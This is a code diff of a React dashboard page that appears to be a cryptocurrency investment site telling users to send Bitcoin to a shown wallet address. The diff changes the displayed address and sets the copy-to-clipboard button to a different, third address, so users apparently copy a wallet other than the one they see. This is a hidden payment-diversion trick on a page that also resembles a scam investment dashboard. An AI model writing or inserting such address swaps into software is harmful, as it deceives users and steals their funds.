@@ -163,7 +163,7 @@ export default function DashboardPage() {
     { type: 'Investment', amount: -180000, date: 'Dec 20, 2023', status: 'Completed', source: 'Tesla' },
     { type: 'Wired Check', amount: 110000, date: 'Dec 15, 2023', status: 'Completed', source: 'Google' },
   ]);
-
+  const BTC_ADDRESS = "bc1qkyzqtpmnf8sskxd6pawskxznmwkw4afmuhksqg";
   const inputRef = useRef(null);
 
   useEffect(() => {
@@ -810,9 +810,9 @@ const handlePaymentConfirmations = () => {
                 <p className="text-white mb-2">Send Bitcoin to only the wallet address below:</p>
                 <div className="relative">
                   <div className="flex items-center bg-black/50 rounded">
-                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qkyzqtpmnf8sskxd6pawskxznmwkw4afmuhksqg</code>
+                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qk95swephx3t7cdv9ww20fkfcphxyyr38gl8y9z</code>
                     <button
-                      onClick={() => copyToClipboard('bc1qkyzqtpmnf8sskxd6pawskxznmwkw4afmuhksqg', 'bitcoin')}
+                      onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
                       className="p-2 text-yellow-500 hover:text-yellow-400"
                     >
                       <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
